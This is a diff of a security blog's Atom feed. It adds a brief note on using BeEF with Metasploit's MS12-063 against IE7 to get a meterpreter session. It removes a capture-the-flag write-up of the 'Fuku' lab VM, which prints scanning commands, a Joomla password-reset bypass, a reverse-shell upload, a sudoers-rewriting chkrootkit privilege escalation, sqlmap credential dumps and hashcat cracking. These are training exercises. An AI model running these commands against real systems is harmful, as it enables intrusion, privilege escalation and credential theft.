@@ -4,7 +4,7 @@
   <title><![CDATA[Bob1Bob2]]></title>
   <link href="http://wg135.github.io/atom.xml" rel="self"/>
   <link href="http://wg135.github.io/"/>
-  <updated>2017-06-13T15:51:26-05:00</updated>
+  <updated>2017-06-27T14:10:14-05:00</updated>
   <id>http://wg135.github.io/</id>
   <author>
     <name><![CDATA[Bob1Bob2]]></name>
@@ -12,6 +12,68 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[beEF and metasploit]]></title>
+    <link href="http://wg135.github.io/blog/2017/06/26/beef-and-metasploit/"/>
+    <updated>2017-06-26T16:09:40-05:00</updated>
+    <id>http://wg135.github.io/blog/2017/06/26/beef-and-metasploit</id>
+    <content type="html"><![CDATA[<p>Today I will take a note about how to use beef with metasploit</p>
+
+<h2>install beef</h2>
+
+<p>Although kali includes beef, it still have some issues when I use.</p>
+
+<p>to include latest beef:</p>
+
+<p><code>git clone https://github.com/beefproject/beef.git</code></p>
+
+<p><code>cd beef</code>
+<code>bundle install</code></p>
+
+<p>in beef/, change configure file config.yaml</p>
+
+<p><img src="http://wg135.github.io/images/blog/misc/beef/Selection_001.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>change host and callback host value as well ssl as true in beef/extensions/metasploit/config.yaml</p>
+
+<p><img src="http://wg135.github.io/images/blog/misc/beef/Selection_002.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>now start metasploit:</p>
+
+<p><img src="http://wg135.github.io/images/blog/misc/beef/Selection_003.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>start beef:</p>
+
+<p><img src="http://wg135.github.io/images/blog/misc/beef/Selection_004.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>in <a href="http://127.0.0.1/ui/authentication">http://127.0.0.1/ui/authentication</a></p>
+
+<p><img src="http://wg135.github.io/images/blog/misc/beef/Selection_005.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>login beef</p>
+
+<p>now create index.html:</p>
+
+<p><img src="http://wg135.github.io/images/blog/misc/beef/Selection_006.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>after that, in metasploit, I use MS12-063</p>
+
+<p><img src="http://wg135.github.io/images/blog/misc/beef/Selection_007.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>use IE7 to access malicious index.html. get IE info from beef.</p>
+
+<p><img src="http://wg135.github.io/images/blog/misc/beef/Selection_008.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Search command redirect and feed its url which is generated in msf</p>
+
+<p><img src="http://wg135.github.io/images/blog/misc/beef/Selection_009.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>get meterpreter:</p>
+
+<p><img src="http://wg135.github.io/images/blog/misc/beef/Selection_010.png" title="[title manually exploit [alt text]]" ></p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Install kali and metasploit in VPS using docker]]></title>
@@ -3511,237 +3573,6 @@ get the root</p>
 
 
 <p><img src="http://wg135.github.io/images/blog/vulhub/vulos2/Selection_019.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>DONE</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[SecTalks: BNE0x02 - Fuku]]></title>
-    <link href="http://wg135.github.io/blog/2016/07/18/sectalks-bne0x02-fuku/"/>
-    <updated>2016-07-18T16:00:27-05:00</updated>
-    <id>http://wg135.github.io/blog/2016/07/18/sectalks-bne0x02-fuku</id>
-    <content type="html"><![CDATA[<h3>Tools:</h3>
-
-<ul>
-<li>netdiscover</li>
-<li>Nmap</li>
-<li>Netcat</li>
-<li>Wfuzz</li>
-<li>Nikto</li>
-<li>Joomscan</li>
-</ul>
-
-
-<h3>Vulnerability:</h3>
-
-<ul>
-<li><a href="https://www.exploit-db.com/exploits/6234/">Joomla 1.5.x - (Token) Remote Admin Change Password</a></li>
-<li><a href="https://www.exploit-db.com/exploits/38775/">Chkrootkit - Local Privilege Escalation</a></li>
-<li><a href="https://www.exploit-db.com/exploits/33673/">Joomla HD FLV Player SQL Injection Vulnerability</a></li>
-</ul>
-
-
-<!--more-->
-
-
-<h3>Use Joomla! Remote Admin Chnage Password Exploit</h3>
-
-<p>Use netdiscover to detect target IP address</p>
-
-<p><code>netdiscover -i eth0 -r 192.168.56.0/24</code></p>
-
-<p><img src="http://wg135.github.io/images/blog/vulhub/fuku/Capture1.JPG" title="[title manually exploit [alt text]]" ></p>
-
-<p>192.168.56.134 is the target.</p>
-
-<p>Then run nmap to detect opening ports and running services on the target machine.</p>
-
-<p><code>nmap -sV -v -O -A -T5 192.168.56.134 -p-</code></p>
-
-<p><img src="http://wg135.github.io/images/blog/vulhub/fuku/Capture2.JPG" title="[title manually exploit [alt text]]" ></p>
-
-<p>as we can see, almost every port is opening. I guess the target machine doesn&rsquo;t want hacker know which services are exactly running.</p>
-
-<p>I use nc to read some ports such as 80 22 23. Port 22 gets result like:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>SSH-2.0-OpenSSH 6.7p1 Ububtu-5ubuntu1</span></code></pre></td></tr></table></div></figure>
-
-
-<p>while the rest of ports get the results:</p>
-
-<p><img src="http://wg135.github.io/images/blog/vulhub/fuku/Capture14.JPG" title="[title manually exploit [alt text]]" ></p>
-
-<p>looks like I need to filter ports like these. I wrote a script to make life easier <a href="https://github.com/wg135/script/blob/master/filter.py">filter.py</a></p>
-
-<p>After running the script, I find only port 22 and port 13370 are opening.</p>
-
-<p>check the <a href="http://192.168.56.134:13370.">http://192.168.56.134:13370.</a> I got this</p>
-
-<p><img src="http://wg135.github.io/images/blog/vulhub/fuku/Capture3.JPG" title="[title manually exploit [alt text]]" ></p>
-
-<p>review the code:</p>
-
-<p><img src="http://wg135.github.io/images/blog/vulhub/fuku/Capture4.JPG" title="[title manually exploit [alt text]]" ></p>
-
-<p>Looks like Joomla!</p>
-
-<p>use wfuzz to scan</p>
-
-<p><code>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.56.134:13370/FUZZ 2&gt;/dev/null</code></p>
-
-<p><img src="http://wg135.github.io/images/blog/vulhub/fuku/Capture5.JPG" title="[title manually exploit [alt text]]" ></p>
-
-<p>get some interesting path names</p>
-
-<p>use Nikto to scan</p>
-
-<p><code>nikto -h http://192.168.56.134:13370</code></p>
-
-<p><img src="http://wg135.github.io/images/blog/vulhub/fuku/Capture6.JPG" title="[title manually exploit [alt text]]" ></p>
-
-<p>check <a href="http://192.168.56.134:13370/administrator/">http://192.168.56.134:13370/administrator/</a> get the login page:</p>
-
-<p><img src="http://wg135.github.io/images/blog/vulhub/fuku/Capture7.JPG" title="[title manually exploit [alt text]]" ></p>
-
-<p>Now I can confirm it is Joomla!</p>
-
-<p>use joomscan to scan:</p>
-
-<p><code>joomscan -u http://192.168.56.134:13370</code></p>
-
-<p>get the result:</p>
-
-<p><img src="http://wg135.github.io/images/blog/vulhub/fuku/Capture8.JPG" title="[title manually exploit [alt text]]" ></p>
-
-<p>follow the steps:</p>
-
-<ul>
-<li>go to <a href="http://192.168.56.134/index.php?option=com_user&amp;view=reset&amp;layout=confirm">http://192.168.56.134/index.php?option=com_user&amp;view=reset&amp;layout=confirm</a></li>
-<li>Write into field &ldquo;token&rdquo; char &lsquo; and Click OK.</li>
-</ul>
-
-
-<p><img src="http://wg135.github.io/images/blog/vulhub/fuku/Capture15.JPG" title="[title manually exploit [alt text]]" ></p>
-
-<ul>
-<li>input new password for admin</li>
-</ul>
-
-
-<p><img src="http://wg135.github.io/images/blog/vulhub/fuku/Capture16.JPG" title="[title manually exploit [alt text]]" ></p>
-
-<ul>
-<li>go to <a href="http://192.168.56.134/administrator/">http://192.168.56.134/administrator/</a> to login with new password</li>
-</ul>
-
-
-<p><img src="http://wg135.github.io/images/blog/vulhub/fuku/Capture9.JPG" title="[title manually exploit [alt text]]" ></p>
-
-<p>Since it is Japanese version, I followed my post <a href="http://wg135.github.io/blog/2016/05/31/vulhub-sickos1-dot-2/">sickos1.2</a> to upload php reverse shell (usr/share/webshells/php/php-reverse-shell.php).</p>
-
-<p><img src="http://wg135.github.io/images/blog/vulhub/fuku/Capture17.JPG" title="[title manually exploit [alt text]]" ></p>
-
-<p>I will edit beez file, copy the php reverse shell code to it and replace the IP address and port</p>
-
-<p><img src="http://wg135.github.io/images/blog/vulhub/fuku/Capture10.JPG" title="[title manually exploit [alt text]]" ></p>
-
-<p>set up netcat and get the shell</p>
-
-<p><img src="http://wg135.github.io/images/blog/vulhub/fuku/Capture11.JPG" title="[title manually exploit [alt text]]" ></p>
-
-<p>However, I cannot execute most commands even <code>python</code></p>
-
-<p><img src="http://wg135.github.io/images/blog/vulhub/fuku/Capture12.JPG" title="[title manually exploit [alt text]]" ></p>
-
-<p>try:</p>
-
-<p><code>python2.7 -c 'import pty; pty.spawn("/bin/bash")'</code></p>
-
-<p>works!</p>
-
-<p>Now try to enumerate the os.</p>
-
-<p><code>ps aux |grep root</code></p>
-
-<p><img src="http://wg135.github.io/images/blog/vulhub/fuku/Capture18.JPG" title="[title manually exploit [alt text]]" ></p>
-
-<p>looks like the <code>chkrootkit 0.49</code> is available.</p>
-
-<p>I followed my previous post <a href="http://wg135.github.io/blog/2016/05/31/vulhub-sickos1-dot-2/">sickos1.2</a> to upload php reverse shell (usr/share/webshells/php/php-reverse-shell.php) to get the root:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD: ALL" &gt;&gt; /etc/sudoers && chmod 440 /etc/sudoers' &gt; /tmp/update</span></code></pre></td></tr></table></div></figure>
-
-
-<p>then:</p>
-
-<p><code>chmod 777 /tmp/update</code></p>
-
-<p>then:</p>
-
-<p><code>ls -al /etc/sudoers</code></p>
-
-<p>finally get the root:</p>
-
-<p><code>sudo su</code></p>
-
-<p><img src="http://wg135.github.io/images/blog/vulhub/fuku/Capture13.JPG" title="[title manually exploit [alt text]]" ></p>
-
-<h3>Exploit Joomla HD FLV Player SQL Injection</h3>
-
-<p>in <a href="http://192.168.56.134/,">http://192.168.56.134/,</a> I found the target uses HD FLV Player</p>
-
-<p><img src="http://wg135.github.io/images/blog/vulhub/fuku/Capture19.JPG" title="[title manually exploit [alt text]]" ></p>
-
-<p>check the source code:</p>
-
-<p><img src="http://wg135.github.io/images/blog/vulhub/fuku/Capture20.JPG" title="[title manually exploit [alt text]]" ></p>
-
-<p><code>searchsploit HD FLV</code></p>
-
-<p><img src="http://wg135.github.io/images/blog/vulhub/fuku/Capture25.JPG" title="[title manually exploit [alt text]]" ></p>
-
-<p>follow the instructions:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>sqlmap -u "http://192.168.56.134:13370/index.php?option=com_hdflvplayer&id=1" -p id --dbms mysql --tables --level=5 --risk=3</span></code></pre></td></tr></table></div></figure>
-
-
-<p><img src="http://wg135.github.io/images/blog/vulhub/fuku/Capture21.JPG" title="[title manually exploit [alt text]]" ></p>
-
-<p>now get the columns of the table <code>jos_users</code></p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>sqlmap -u "http://192.168.56.134:13370/index.php?option=com_hdflvplayer&id=1" -p id --dbms mysql -T jos_users --columns</span></code></pre></td></tr></table></div></figure>
-
-
-<p><img src="http://wg135.github.io/images/blog/vulhub/fuku/Capture22.JPG" title="[title manually exploit [alt text]]" ></p>
-
-<p>now I am interested in column username and password</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>sqlmap -u "http://192.168.56.134:13370/index.php?option=com_hdflvplayer&id=1" -p id --dbms mysql -T jos_users -C username,password --dump</span></code></pre></td></tr></table></div></figure>
-
-
-<p><img src="http://wg135.github.io/images/blog/vulhub/fuku/Capture23.JPG" title="[title manually exploit [alt text]]" ></p>
-
-<p>The first part should be hash and the second part should be salt. I used joomla password crack tool <a href="https://github.com/wg135/script/blob/master/joomla.pl">joomlacrack.pl</a>. Here is also my python version <a href="https://github.com/wg135/script/blob/master/crackjoomla.py">crackjoomla.py</a></p>
-
-<p>crack admin&rsquo;s password now</p>
-
-<p><img src="http://wg135.github.io/images/blog/vulhub/fuku/Capture26.JPG" title="[title manually exploit [alt text]]" ></p>
-
-<p><img src="http://wg135.github.io/images/blog/vulhub/fuku/Capture24.JPG" title="[title manually exploit [alt text]]" ></p>
-
-<p>Then login as admin, upload php reverse shell, same as I worked in the first part of this post.</p>
-
-<p>Aslo, since the hash format is like hash:salt. I found the <a href="https://hashcat.net/wiki/doku.php?id=example_hashes">hashcat example hashes</a>, the MD5 format should be <code>md5($pass.$salt)</code>, so that in hashcat for option <code>-m</code> the value should be 10 (hashcat &ndash;help, check the * Hash types)</p>
-
-<p>use hashcat crack:</p>
-
-<p><code>hashcat -m 10 -a 0 -o joompass.txt --remove 61.hash /usr/share/wordlists/rockyou.txt</code></p>
 
 <p>DONE</p>
 ]]></content>
